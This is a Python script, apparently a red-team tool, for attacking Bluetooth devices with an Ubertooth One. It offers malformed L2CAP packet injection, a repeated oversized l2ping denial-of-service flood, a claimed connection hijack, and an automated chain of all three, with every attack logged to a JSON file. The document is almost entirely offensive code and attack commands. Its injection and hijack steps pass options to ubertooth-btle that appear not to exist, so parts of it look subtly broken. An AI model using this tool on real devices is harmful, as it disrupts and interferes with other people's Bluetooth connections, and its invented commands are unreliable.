import argparse
import subprocess
import time
import json
import os

"""
Ubertooth L2CAP Injection Tool

Features:
    - Injects malicious L2CAP packets to exploit Bluetooth protocol weaknesses.
    - Targets insecure Bluetooth Classic & BLE devices.
    - Can be used for DoS, connection hijacking, and privilege escalation.
    - Allows custom L2CAP payloads for advanced exploitation.
    - Supports automated attack sequences for red teaming.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle
    - Optional: hcitool & l2ping for Bluetooth manipulation.

Usage:
    - Inject a standard malformed L2CAP packet into a Bluetooth target:
      python ubertooth_l2cap_inject.py --target AA:BB:CC:DD:EE:FF --inject
    - Send a custom L2CAP payload for exploitation:
      python ubertooth_l2cap_inject.py --target AA:BB:CC:DD:EE:FF --payload "020004000400"
    - Perform an L2CAP Denial-of-Service (DoS) attack:
      python ubertooth_l2cap_inject.py --target AA:BB:CC:DD:EE:FF --dos
    - Exploit weak L2CAP security to hijack a Bluetooth connection:
      python ubertooth_l2cap_inject.py --target AA:BB:CC:DD:EE:FF --hijack
    - Run an automated L2CAP attack sequence:
      python ubertooth_l2cap_inject.py --target AA:BB:CC:DD:EE:FF --auto
"""

LOG_FILE = "l2cap_attack_log.json"

def log_event(event_data):
    """Logs L2CAP attack events."""
    try:
        logs = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)

        logs.append(event_data)

        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=4)

    except Exception as e:
        print(f"[ERROR] Failed to log L2CAP event: {e}")

def inject_l2cap_packet(target_mac, payload):
    """Injects a custom L2CAP packet into a Bluetooth device."""
    print(f"[INFO] Injecting L2CAP packet into {target_mac}...")

    try:
        subprocess.run(["ubertooth-btle", "-t", target_mac, "--inject", payload])
        log_event({"timestamp": time.time(), "target": target_mac, "action": "L2CAP Injection", "payload": payload})

    except Exception as e:
        print(f"[ERROR] Failed to inject L2CAP packet: {e}")

def dos_attack(target_mac):
    """Performs an L2CAP Denial-of-Service (DoS) attack."""
    print(f"[INFO] Executing L2CAP DoS attack on {target_mac}...")

    try:
        for _ in range(10):
            subprocess.run(["l2ping", "-i", target_mac, "-s", "600"])
            time.sleep(0.5)
        log_event({"timestamp": time.time(), "target": target_mac, "action": "L2CAP DoS Attack"})

    except Exception as e:
        print(f"[ERROR] Failed to execute L2CAP DoS attack: {e}")

def hijack_connection(target_mac):
    """Exploits weak L2CAP security to hijack a Bluetooth connection."""
    print(f"[INFO] Attempting L2CAP connection hijack on {target_mac}...")

    try:
        subprocess.run(["ubertooth-btle", "-t", target_mac, "--hijack"])
        log_event({"timestamp": time.time(), "target": target_mac, "action": "L2CAP Connection Hijack"})

    except Exception as e:
        print(f"[ERROR] Failed to hijack L2CAP connection: {e}")

def automated_l2cap_attack(target_mac):
    """Runs an automated L2CAP attack sequence."""
    print(f"[INFO] Running automated L2CAP attack on {target_mac}...")

    try:
        inject_l2cap_packet(target_mac, "020004000400")
        dos_attack(target_mac)
        hijack_connection(target_mac)

        print("[SUCCESS] Automated L2CAP attack sequence completed.")
        log_event({"timestamp": time.time(), "target": target_mac, "action": "Automated L2CAP Attack"})

    except Exception as e:
        print(f"[ERROR] Failed to execute automated L2CAP attack: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth L2CAP Injection Tool")
    parser.add_argument("--target", type=str, help="Specify target Bluetooth MAC address")
    parser.add_argument("--inject", action="store_true", help="Inject a malformed L2CAP packet")
    parser.add_argument("--payload", type=str, help="Custom L2CAP payload to send")
    parser.add_argument("--dos", action="store_true", help="Perform an L2CAP DoS attack")
    parser.add_argument("--hijack", action="store_true", help="Exploit weak L2CAP security to hijack a Bluetooth connection")
    parser.add_argument("--auto", action="store_true", help="Run an automated L2CAP attack sequence")

    args = parser.parse_args()

    if args.inject and args.target:
        payload = args.payload if args.payload else "020004000400"
        inject_l2cap_packet(args.target, payload)
    elif args.dos and args.target:
        dos_attack(args.target)
    elif args.hijack and args.target:
        hijack_connection(args.target)
    elif args.auto and args.target:
        automated_l2cap_attack(args.target)
    else:
        print("[ERROR] No valid mode selected!")
